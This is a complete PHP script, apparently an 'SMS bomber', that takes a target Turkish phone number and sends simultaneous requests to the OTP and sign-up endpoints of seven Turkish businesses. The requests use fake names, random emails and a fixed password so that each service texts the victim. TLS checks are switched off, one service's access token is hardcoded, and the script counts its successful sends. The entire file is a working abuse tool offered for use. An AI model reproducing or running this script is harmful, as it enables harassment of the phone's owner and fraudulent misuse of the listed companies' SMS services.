<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$phone = isset($_GET['no']) ? trim($_GET['no']) : null;

if (!$phone) {
    echo json_encode(['success' => false, 'message' => 'no parametresi gerekli. Ornek: ?no=5528785353'], JSON_UNESCAPED_UNICODE);
    exit;
}

$phone = str_replace(['+90', ' ', '(', ')', '-'], '', $phone);
$phone = ltrim($phone, '0');

if (strlen($phone) != 10 || !is_numeric($phone)) {
    echo json_encode(['success' => false, 'message' => 'Geçersiz numara'], JSON_UNESCAPED_UNICODE);
    exit;
}

$mail = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 12) . '@gmail.com';

$services = [
    ['Metro', 'https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend',
     ['Content-Type: application/json'],
     json_encode(['methodType' => '2', 'mobilePhoneNumber' => $phone])],
    
    ['Suiste', 'https://suiste.com/api/auth/code',
     ['Content-Type: application/x-www-form-urlencoded'],
     http_build_query(['action' => 'register', 'gsm' => $phone])],
    
    ['Baydöner', 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
     ['Content-Type: application/json', 'Merchantid: 5701'],
     json_encode(['PhoneNumber' => $phone, 'Name' => 'Ahmet', 'Surname' => 'Yilmaz', 'Email' => $mail, 'Password' => 'Test1234!', 'AreaCode' => 90, 'AppVersion' => '1.6.0', 'Platform' => 1])],
    
    ['Hayatsu', 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',
     ['Content-Type: application/x-www-form-urlencoded'],
     http_build_query(['mobilePhoneNumber' => $phone, 'actionType' => 'register'])],
    
    ['Yapp', 'https://yapp.com.tr/api/mobile/v1/register',
     ['Content-Type: application/json'],
     json_encode(['phone_number' => $phone, 'firstname' => 'Ahmet', 'lastname' => 'Yilmaz', 'email' => $mail, 'device_type' => 'I', 'device_version' => '15.0', 'language_id' => '2'])],
    
    ['Porty', 'https://panel.porty.tech/api.php',
     ['Content-Type: application/json', 'Token: q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ'],
     json_encode(['job' => 'start_login', 'phone' => $phone])],
    
    ['WMF', 'https://www.wmf.com.tr/users/register/',
     ['Content-Type: application/x-www-form-urlencoded'],
     http_build_query(['confirm' => 'true', 'date_of_birth' => '1990-01-01', 'email' => $mail, 'first_name' => 'Ahmet', 'last_name' => 'Yilmaz', 'password' => 'Test1234!', 'phone' => '0'.$phone])],
];

$success = 0;
$failed = 0;

$mh = curl_multi_init();
$handles = [];

foreach ($services as $svc) {
    list($name, $url, $headers, $data) = $svc;
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => $headers,
    ]);
    
    curl_multi_add_handle($mh, $ch);
    $handles[] = ['ch' => $ch, 'name' => $name];
}

do {
    curl_multi_exec($mh, $running);
} while ($running > 0);

foreach ($handles as $h) {
    $httpCode = curl_getinfo($h['ch'], CURLINFO_HTTP_CODE);
    if (in_array($httpCode, [200, 201, 202])) {
        $success++;
    } else {
        $failed++;
    }
    curl_multi_remove_handle($mh, $h['ch']);
    curl_close($h['ch']);
}

curl_multi_close($mh);

$totalSent = $success > 0;

echo json_encode([
    'success' => $totalSent,
    'phone' => '+90' . $phone,
    'message' => $totalSent ? 'SMS başarıyla gönderildi! ✅' : 'SMS gönderilemedi ❌',
    'sent' => $success,
    'failed' => $failed,
    'Developer' => '@TuncaySkay'
], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
?>
